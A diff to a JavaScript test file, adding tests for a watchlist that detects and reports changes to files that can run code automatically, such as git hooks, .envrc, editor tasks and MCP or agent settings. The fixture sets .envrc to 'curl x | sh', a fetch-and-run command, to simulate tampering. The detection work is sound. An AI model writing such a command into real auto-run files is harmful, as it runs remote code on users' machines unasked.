@@ -272,6 +272,39 @@ test('watchlist: a snapshot before the turn\'s first prompt goes, one after its 
   mgr.closeAll();
 });
 
+test('watchlist: the page asks for a check now (the Review pane changed a watched file): told at once, not again at the next turn', async () => {
+  const env0 = file('.envrc', 'x=1\n'), env1 = file('.envrc', 'curl x | sh\n');
+  const w = watcher([[env0], [env0], [env1], [env1]]);
+  const { mgr, events } = manager({ watcher: w });
+  const s = mgr.get(mgr.open({}).id);
+  s.prompt({ text: 'one' });
+  await tick(60);
+  await s.watchNow();
+  const evs = () => events.map(([, , e]) => e).filter((e) => e.type === 'watch');
+  assert.equal(evs().length, 1);
+  assert.equal(evs()[0].when, 'between');
+  assert.deepEqual(evs()[0].changes.map((c) => c.path), ['.envrc']);
+  s.prompt({ text: 'two' });
+  await tick(60);
+  assert.equal(evs().length, 1, 'the next turn does not report it again');
+  // while a turn runs it does nothing (the turn's end reports what changed)
+  s.state = 'busy';
+  const n = w.calls.length;
+  await s.watchNow();
+  assert.equal(w.calls.length, n);
+  mgr.closeAll();
+});
+
+// the watchlist's fixed patterns: the page mirrors them for the Review pane (code/web/src/review.ts watchKind, whose
+// test has the same table)
+export const WATCH_TABLE = [['.git/hooks/pre-commit', 'git-hook'], ['.git/config', 'git-config'], ['.husky/pre-push', 'husky'], ['.envrc', 'direnv'],
+  ['.vscode/tasks.json', 'vscode'], ['app.code-workspace', 'vscode'], ['.claude/settings.local.json', 'claude'], ['.mcp.json', 'mcp'], ['package.json', 'npm'],
+  ['.npmrc', 'package-manager'], ['.devcontainer/x/devcontainer.json', 'devcontainer'], ['lefthook.yml', 'hook-manager'], ['src/package.json', null],
+  ['.claude\\settings.json', null], ['README.md', null]];
+test('watchlist: the fixed patterns (the same table as the page\'s)', () => {
+  for (const [p, kind] of WATCH_TABLE) assert.equal(watched(p)?.kind ?? null, kind, p);
+});
+
 test('watchlist: changes between turns are told at the next turn\'s start; a refused revert says why; an old sandbox turns it off once', async () => {
   const env0 = file('.envrc', 'x=1\n'), env1 = file('.envrc', 'curl x | sh\n');
   const w = watcher([[env0], [env0], [env1], [env1]]);
